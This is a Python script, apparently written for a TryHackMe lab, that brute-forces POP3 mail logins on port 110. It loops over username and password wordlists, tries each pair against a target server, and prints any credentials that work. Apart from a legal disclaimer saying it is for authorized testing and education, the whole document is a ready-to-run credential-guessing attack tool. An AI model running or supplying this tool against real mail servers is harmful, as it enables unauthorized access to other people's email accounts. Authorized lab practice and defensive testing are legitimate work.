# ---------------------------------------------------------------
#  Project: POP3 Authentication Automation
#  Author: Roldan
#  THM: https://tryhackme.com/p/ROLDAN.S.LOBITANA.JR 
#  Copyright (c) 2026
#
#  Description:
#      This script demonstrates how to automate POP3 authentication
#      for testing and educational purposes. It is intended ONLY for
#      use on systems you own or have explicit, written permission to test.
#
#  Legal Disclaimer:
#      This script is provided strictly for lawful, authorized security
#      testing and educational research. The author does NOT condone or
#      support unauthorized access, misuse, or malicious activity of any kind.
#
#      By using this script, YOU accept full responsibility for ensuring
#      that your actions comply with all applicable laws, regulations,
#      and authorization requirements. The author assumes NO liability
#      for any damages, legal consequences, or misuse resulting from
#      the use of this code.
#
#  License:
#      This code is provided "as is" without warranty of any kind.
# ---------------------------------------------------------------

import poplib
import sys

import poplib
import signal
import sys

# ANSI colors
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
RESET = "\033[0m"

def handle_exit(signum, frame):
    print(f"\n{RED}[!] End{RESET}")
    sys.exit(0)

signal.signal(signal.SIGINT, handle_exit) 
signal.signal(signal.SIGTSTP, handle_exit)  

# Argument check
if len(sys.argv) != 4:
    print(f"{YELLOW}Usage:{RESET} python3 pop3-bf.py <Machine_IP> <UserList> <PassList>")
    sys.exit(1)


server = sys.argv[1]
port = 110

# Wordlists
userlist = sys.argv[2]
passlist = sys.argv[3]

# Load wordlists
try:
    with open(userlist, "r") as f:
        users = [u.strip() for u in f.readlines()]
    with open(passlist, "r") as f:
        passwords = [p.strip() for p in f.readlines()]
except FileNotFoundError:
    print(f"{RED}[!] Wordlist file not found, check the usefiler|passfile{RESET}")
    sys.exit(1)

print(f"{YELLOW}[*] Starting POP3 Brute-Force attempts...{RESET}")

# Brute-force loop
for user in users:
    for password in passwords:
        print(f"{YELLOW}[*] Trying {user}:{password}{RESET}")

        try:
            pop = poplib.POP3(server, port)
            pop.user(user)
            pop.pass_(password)

            print(f"{GREEN}[✔] Login successful → {user}:{password}{RESET}")
            pop.quit()
            break
        except poplib.error_proto:
            print(f"{RED}[✘] Login failed{RESET}")
            pop.quit()
        except Exception as e:
            print(f"{RED}[✘] Connection error: {e}{RESET}")
            break
